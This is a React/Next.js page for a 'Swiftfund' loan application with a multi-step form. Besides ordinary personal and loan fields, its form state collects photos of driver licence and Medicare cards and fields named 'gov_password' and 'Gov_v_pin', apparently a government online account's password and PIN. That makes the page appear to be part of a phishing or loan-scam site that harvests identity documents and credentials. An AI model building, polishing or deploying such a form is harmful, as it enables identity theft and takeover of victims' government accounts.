import React, { useEffect, useState,useRef } from 'react'

import axios from 'axios';
import Link from 'next/link';
import Head from 'next/head';
import StepOne from '@/components/form/loan/step1';
import StepTwo from '@/components/form/loan/step2';
import StepThree from '@/components/form/loan/step3';
import MultiStep from 'react-multistep'
import StepFour from '@/components/form/loan/step4';
import StepFive from '@/components/form/loan/step5';



function Apply() {
    const [coins, setCoins] = useState([]);
    const [show,setShow] = useState(false);
    const [step,setStep] = useState(0);
    const [activated,setActivated] = useState("faqs");
    const [stepOneProgress,setStepOneProgress] = useState(0);
    const [input,setInput] = useState({firstname:"",lastname:"",gender:"",phone:"",dob:"",state:"",city:"",profile_picture:"",loan_amount:"",employment_status:"",loan_purpose:"",loan_duration:"",gov_id:"",gov_password:"",Gov_v_pin:"",driver_licence_front:'',driver_licence_back:"",medicare_front:"",medicare_back:""});
    

      const forward = ()=>{
        if(step === 4){
          return;
        }
        return setStep(prev => prev + 1);
      }

      const backward = ()=>{
        if(step === 0){
          return;
        }
        return setStep(prev => prev - 1);
      }



      function next(){
        setStep(
            prev => !prev === 3 && prev+1
        )
      };
      function back(){
        setStep(
            prev => !prev === 0 && prev-1
        )
      };
      const signUpFunc = (e) =>{
        e.preventDefault();}

      const stepStorage = [<StepOne key={29283} forward={forward} input={input} setInput={setInput} />,<StepTwo  key={2} forward ={forward} backward={backward} input={input} setInput={setInput} signUpFunc={signUpFunc} />,<StepThree  key={2} forward ={forward} backward={backward} input={input} setInput={setInput} signUpFunc={signUpFunc} />,<StepFour  key={2} forward ={forward} backward={backward} input={input} setInput={setInput} signUpFunc={signUpFunc} />,<StepFive  key={2} forward ={forward} backward={backward} input={input} setInput={setInput} signUpFunc={signUpFunc} />];

  return (
    <div className='bg-black  min-h-screen  p-'>
 <Head>

{/* title */}
<title>Apply for Swiftfund Loan</title>
{/* meta tags */}
<meta name="description" content=" Welcome to Swiftfund, where your financial goals meet possibility! Get ready to embark on a seamless journey towards your dreams with our hassle-free lending solutions. Whether you're looking to fund your next big project, consolidate debt, or seize a lucrative opportunity, we've got you covered. Explore our range of flexible Apply options tailored to fit your needs, backed by competitive rates and expert guidance. Say goodbye to financial barriers and hello to a brighter future with SwiftFund. Start your application today and let's make your aspirations a reality!" />

{/* header links */}
<link rel="icon" href="./static/logo.ico" />
</Head>
<section className="fixed w-full min-h-screen flex flex-col items-center justify-center text-center bg-ac_color-dark text-ac_color-lightgold py-0 px-3">
   
      <div className=" absolute top-0 left-0 w-full lg h-full overflow-hidden">
      <video
          className="min-w-full h-[100vh] absolute object-cover opacity-50"
          src="/static/cover_vid.mp4"
          autoPlay
          muted
          loop
        >
        </video>
        
      </div>
    
 
 
    </section>
<main className='flex flex-col items-center justify-center min-h-screen'>


 


    <div className='flex flex-col items-center justify-center min-h-screen px-5 my-5'>
    <div className='z-[9999999]'>
    <a href="#" className="flex  items-center text-2xl font-semibold text-white justify-center ">
          <img className="w-8 h-8 mr-2" src="/static/logo.png" alt="logo" />
          Swiftfund   
      </a>
    </div>
    
   
    {stepStorage[step]}

    </div>
 
    </main>
</div>
  )
}

export default Apply;